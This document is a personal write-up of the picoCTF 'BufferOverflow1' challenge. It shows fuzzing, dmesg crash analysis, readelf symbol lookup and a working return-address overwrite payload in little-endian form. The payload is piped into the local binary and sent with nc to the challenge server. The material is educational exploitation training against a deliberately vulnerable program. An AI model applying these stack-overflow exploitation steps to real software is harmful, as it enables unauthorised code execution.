---
layout: default
---



# picoCTF binary explotation series
ref. https://artifacts.picoctf.net

## BufferOverflow1

Tags: 252 

#### You may need to register to picoCTF to access the files
---------------------------------------------------------------------------------

#### Description

Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the program:

[Link to the vuln program](https://artifacts.picoctf.net/c/252/vuln).

[Link to the source code of the program](https://artifacts.picoctf.net/c/252/vuln.c).

To remotey test and connect [use the link and select binary explotation](https://artifacts.picoctf.net).




Make sure you consider big Endian vs small Endian.

Changing the address of the return pointer can call different functions.


**First thing need to check is if we can un 32bit apps on our 64bit System in my case I had to  install ib32-glibc**

```
pacman -S **lib32-glibc**

```
---------------------------------------------------------------------------------  
  

### We start running the program and try fuzzing and see how it works 

```
Please enter your string: 
AAA
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

```


```
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

```

Open a new terminal and write:

```python

❯ python3
Python 3.10.8 (main, Nov  1 2022, 14:18:21) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "A" * 32
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

>>> "A" * (32+4+4)
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

```

```
❯ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
zsh: segmentation fault (core dumped)  ./vuln
```

The way that C at low level denotes the end of a string, is adding a NULL BYTE which can be represented as:
```
0x00
\\x00
\\0
```

```
dmesg
vuln[166458]: segfault at 41414141 ip 0000000041414141 sp 00000000ffe924f0 error 14 in libc.so.6[f7c00000+1e000]
```

```
❯ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x8049300
zsh: segmentation fault (core dumped)  ./vuln
```

```
❯ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141
zsh: segmentation fault (core dumped)  ./vuln
```


sending some more As we can see that the address is jumping to is changing until is filled up with 0x41414141 Address, but 0x41414141 represents AAAA in hex, so we find the way to control the stack and the address to jump to
```python
>>> ord("A")
65   <- Decimal
>>> hex(65)
'0x41' <- hexadecimal
>>> 
```

```
with dmesg we get 
 segfault at 41414141 ip 0000000041414141 sp 00000000ffa36570 error 14 in libc.so.6[f7c00000+1e000]
```

**IP instructor pointer**
ip basically means that we can now jump wherever we want to, but where to jump?\
We want to jump to the funtion "win" but we need to locate this in the binary so we can use
a toold readelf **READELF install pacman -S binutils

This is where do we want to go in the source file

```
void win() {
  12   │   char buf[FLAGSIZE];
  13   │   FILE *f = fopen("flag.txt","r");
  14   │   if (f == NULL) {
  15   │     printf("%s %s", "Please create 'flag.txt' in this director
       │ y with your",
  16   │                     "own debugging flag.\n");
  17   │     exit(0);
  18   │   }
```

Since we want to find information of this function in the binary, we use readelf interesting tag which is -s or --syms \
Display the symbol table _this case work because when we run :file vuln there's the info telling is 'not stripped'_
So\
```
readelf -s vuln
```

Bum, address of the win function

```python

    62: 08049350   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win
    64: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.0
    65: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
    66: 0804c040     0 NOTYPE  GLOBAL DEFAULT   24 _end
    67: 08049120     5 FUNC    GLOBAL HIDDEN    13 _dl_relocate_sta[...]


 080491f6   139 FUNC    GLOBAL DEFAULT   13 win

 ```


Back to the application we can confirm that we can write the address of the instructor

```
❯ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
zsh: segmentation fault (core dumped)  ./vuln

```
now the address changed to 0x42424242 <-BBBB

But if we pass the address we want to go: 080491f6

```
❯ ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA080491f6
Okay, time to return... Fingers Crossed... Jumping to 0x34303830
zsh: segmentation fault (core dumped)  ./vuln
```
Output shows not the correct  address we want to go and this is because in memory it stored filped over\
So **instead of 0x080491f6 in little endian 0xf6910408 and byte by byte would be the proper format eg "\xf6\x91\x04\x08"**

In python also is not representing the way it shout, there's this ö character which smells bad
 
 ```
 "A" * (32+4+4+4)+"\xf6\x91\x04\x08"
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAö\x91\x04\x08'
```

```
❯ ./vuln
Please enter your string: 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAö\x91\x04\x08'
Okay, time to return... Fingers Crossed... Jumping to 0x5cb6c341
zsh: segmentation fault (core dumped)  ./vuln
```
and wrong address again Jumping to 0x5cb6c341

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08

```
❯ python3 -c "print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 c3b6 c291  AAAAAAAAAAAA....
00000030: 0408 0a  

 c3b6 c291 0408 0a  
```

this looks a bit strange of what we passed: c3b6 
```
❯ python3 -c "print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x91c2b6c3
zsh: done                              python3 -c  | 
zsh: segmentation fault (core dumped)  ./vuln
```
Wrong address again Jumping to 0x91c2b6c3\

------------------------------------------------------------------------------------------
### HINT

**PRINT IS  NOT OUR FRIEND ANYMORE BECAUSE IT DOESN'T DISPLAY THE PROPER CHARACTERS BUT IT TRIES TO PRINT SOMETHING THAT CAN BE CLOSEST OR FOR ANOTHER USE**

-----------------------------------------------------------------------------------------

To do this ''inline'' which it drops you on the shell after the program 
```
❯ python3 -c
```
```
❯ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')"
output
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%
```
```python
❯ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" |xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 f691 0408  AAAAAAAAAAAA....
```

Now looks exactly what we want fliped over like little endian and we can try to pass it trhough and it interprets the jumping address

```python
❯ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.

```


Now start looking quite interesting, what if we create a flag.txt in our directory
```bash
echo 'KELFLAG{Toma_ya_lo_tenemo}' > flag.txt
```

```python
❯ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
KELFLAG{Toma_ya_lo_tenemo}
zsh: done                              python3 -c  | 
zsh: segmentation fault (core dumped)  ./vuln
```

!!!!! paaaaammm!!!!! it prints our file

Now all we have to do is run our script agains the server and see if we can get the flag:

```python

❯ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAA ...
AAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | nc saturn.picoctf.net 51340

```

but it doesn't send or run on the server so let's create an exploit in python



